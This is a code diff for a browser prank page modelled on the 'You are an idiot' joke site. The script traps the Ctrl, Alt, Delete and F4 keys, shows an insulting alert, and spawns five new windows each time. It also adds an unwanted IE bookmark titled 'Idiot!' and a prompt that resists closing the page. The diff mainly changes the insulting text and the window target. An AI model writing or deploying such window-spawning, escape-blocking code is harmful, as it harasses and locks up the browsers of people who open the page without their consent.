@@ -8,11 +8,11 @@ function musicPlay() {
 	micon.addEventListener('click', musicPlay);
 	
 	if (audio.duration > 0 && audio.paused) {
-		audio.pause();
+		audio.play();
 		micon.src = "images/speaker.png";
 	}
 	else {
-		audio.play();
+		audio.pause();
 		audio.currentTime = 0;
 		
 		micon.src = "images/speakerm.png";
@@ -36,7 +36,7 @@ faudio.addEventListener('timeupdate', function() {
 
 function bookmark() {
 	if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
-		var url = "index.html";
+		var url = "lol.html";
 		var title = "Idiot!";
 		
 		window.external.AddFavorite(url, title);
@@ -59,7 +59,7 @@ function openWindow(url) {
 
 function proCreate() {	
 	for (var i = 0; i < 5; i++) {
-		openWindow('index.html');
+		openWindow('lol.html');
 	}
 }
 
@@ -128,7 +128,7 @@ window.onkeydown = function() {
 	var keyCode = event.keyCode;
 	
 	if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {	
-		alert("what the sigma"); 
+		alert("You are an idiot!"); 
 		proCreate();
 	}
 	
@@ -136,6 +136,6 @@ window.onkeydown = function() {
 }
 
 window.onbeforeunload = function() {
-    return "are you a sigma";
+    return "Are you an idiot?";
 };
 /* [Oct 2021] End of amendments. */
